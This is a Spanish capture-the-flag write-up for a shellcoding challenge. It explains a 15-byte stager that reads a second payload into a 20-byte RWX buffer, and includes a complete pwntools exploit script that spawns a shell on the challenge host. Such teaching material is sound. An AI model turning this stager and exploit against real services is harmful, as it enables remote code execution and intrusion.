---
title: "Tiny"
description: 'El objetivo de este desafío consistía en explotar un servicio binario que ejecuta código suministrado por el usuario. La restricción principal era un límite estricto de entrada de 20 bytes, espacio insuficiente para un shellcode estándar en arquitectura x86-64 (que típicamente requiere 27-30 bytes para `execve`).'
pubDate: 'Jan 25 2026'
heroImage: ''
ctf: 'Fluid Attack 2026'
---

**Categoría:** Pwn / Shellcoding
**Arquitectura:** x86-64 (amd64)
**Etiquetas:** Shellcoding, Stager, Segmentos RWX

## Resumen Ejecutivo

El objetivo de este desafío consistía en explotar un servicio binario que ejecuta código suministrado por el usuario. La restricción principal era un límite estricto de entrada de **20 bytes**, espacio insuficiente para un shellcode estándar en arquitectura x86-64 (que típicamente requiere 27-30 bytes para `execve`). La solución implicó el desarrollo de un **Stager** personalizado de 15 bytes para invocar una llamada al sistema `read` secundaria, permitiendo la inyección de un payload de mayor tamaño sin restricciones.

## Reconocimiento y Análisis

### Análisis Estático

El binario es un ejecutable ELF de 64 bits. El código fuente de ghidra indica el siguiente comportamiento:

1. **Asignación de Memoria:** Utiliza `mmap` para asignar una página de memoria con permisos `PROT_READ | PROT_WRITE | PROT_EXEC` (RWX).
2. **Manejo de Entrada:** Lee hasta 20 bytes desde la entrada estándar hacia esta memoria ejecutable.
3. **Mecanismo de Relleno:** Críticamente, si la entrada es menor a 20 bytes, el espacio restante se rellena automáticamente con `0x90` (instrucciones NOP).
4. **Ejecución:** El programa salta al inicio del buffer de memoria para ejecutar las instrucciones.

### Las Restricciones

* **Límite de Espacio:** 20 bytes.
* **Objetivo:** Obtener ejecución remota de código (RCE) o leer la flag.
* **Obstáculo:** Un shellcode estándar para ejecutar `execve("/bin/sh", 0, 0)` requiere configurar los registros `RAX`, `RDI`, `RSI` y `RDX`, además de cargar la cadena "/bin/sh". Esta operación excede el buffer disponible.

## Estrategia de Explotación

Para eludir la restricción de tamaño, se empleó una técnica de explotación en dos fases.

### Fase 1: El Stager

Se diseñó un fragmento de código ensamblador (Stager) que se ajusta al límite. Su único propósito es invocar la llamada al sistema `sys_read` para leer un segundo payload más grande en memoria.

**Configuración de Registros para `sys_read` (syscall 0):**

* `RAX` (Número de Syscall): 0
* `RDI` (Descriptor de Archivo): 0 (stdin)
* `RSI` (Buffer): Dirección donde se escribirá el nuevo código.
* `RDX` (Cantidad): Número de bytes a leer.

**Ensamblador Optimizado (15 bytes):**

```assembly
xor edi, edi      ; RDI = 0
mul edi           ; RAX = 0, RDX = 0
mov dl, 0xff      ; RDX = 255
lea rsi, [rip+7]  ; RSI = Dirección relativa (Offset 20)
syscall           ; Ejecutar sys_read

```

### Fase 2: Alineación de Memoria y Control de Flujo

El análisis dinámico reveló que la instrucción `lea` combinada con el comportamiento de auto-relleno del programa proporcionaba un flujo de ejecución fiable.

1. **El Stager (Bytes 0-14):** Ocupa los primeros 15 bytes.
2. **El Relleno (Bytes 15-19):** El binario llena los 5 bytes restantes con `0x90` (NOPs).
3. **El Objetivo (Byte 20):** La instrucción `lea rsi, [rip+7]` calcula la dirección exacta en el offset 20 (justo después del bloque asignado).

Al ejecutarse el `syscall`, el programa pausa esperando entrada. Al enviar el segundo payload:

1. El `read` escribe el Shellcode comenzando en el Byte 20.
2. El puntero de instrucción (RIP) continúa la ejecución.
3. Se desliza a través de los NOPs (Bytes 15-19).
4. Ejecuta el Shellcode secundario en el Byte 20 sin errores de alineación ni excepciones `SIGILL`.

### Detalles de Conexión Remota

El servicio objetivo estaba alojado en un puerto TCP envuelto en SSL/TLS. El exploit requirió configuraciones específicas en la librería `pwntools` (`ssl=True`, `sni=HOST`) para gestionar el handshake correctamente.

## Código del Exploit

El siguiente script en Python utiliza la librería `pwntools` para automatizar el ataque.

```python
from pwn import *
import time

context.arch = 'amd64'
HOST = 'd8b4d5c4eb85acbd.chal.ctf.ae'
PORT = 443

def main():
    log.info(f"Conectando a {HOST}:{PORT}...")
    
    try:
        io = remote(HOST, PORT, ssl=True, sni=HOST)
    except Exception as e:
        log.error(f"Fallo de conexión: {e}")
        return

    io.recvuntil(b"exec service.\n")

    # --- FASE 1: Stager (15 bytes) ---
    # Lee 255 bytes adicionales y los escribe en el offset 20
    stager = asm("""
        xor edi, edi
        mul edi
        mov dl, 0xff
        lea rsi, [rip+7]
        syscall
    """)

    log.info(f"Enviando Stager ({len(stager)} bytes)...")
    io.send(stager)

    # Latencia para permitir el procesamiento del syscall
    time.sleep(1)

    # --- FASE 2: Payload Completo ---
    # Shellcode estándar x64. Se escribirá después del padding de NOPs.
    payload = asm(shellcraft.sh())

    log.info(f"Enviando Payload ({len(payload)} bytes)...")
    io.send(payload)

    log.success("Exploit enviado. Iniciando sesión interactiva.")
    io.clean()
    io.interactive()

if __name__ == "__main__":
    main()

```

## Conclusión

Este desafío demostró la importancia de la manipulación precisa de registros y la alineación de memoria en entornos restringidos. Al comprender el comportamiento subyacente del binario (específicamente el relleno con NOPs) y utilizar un mecanismo de carga en dos fases, se logró eludir la limitación de 20 bytes para conseguir la ejecución remota de código.
